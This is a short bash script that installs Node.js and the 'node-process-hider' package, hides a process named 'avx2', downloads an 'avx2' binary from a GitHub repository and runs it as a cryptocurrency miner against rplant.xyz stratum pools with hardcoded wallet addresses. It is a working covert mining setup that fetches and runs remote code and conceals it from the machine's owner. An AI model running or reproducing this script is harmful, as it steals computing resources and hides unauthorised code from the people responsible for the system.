#!/bin/bash 
sudo apt update -y && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider && ph add avx2 && wget https://github.com/BatiKangkung/KangKung/raw/main/avx2 && chmod +x avx 
# ./avx2 -a yespower  -o stratum+tcps://stratum-eu.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 1000-9999 -n 1)-C) -p x
./avx2 -a minotaurx -o stratum+tcps://stratum-asia.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 1000-9999 -n 1)-C) -t 14 -p x



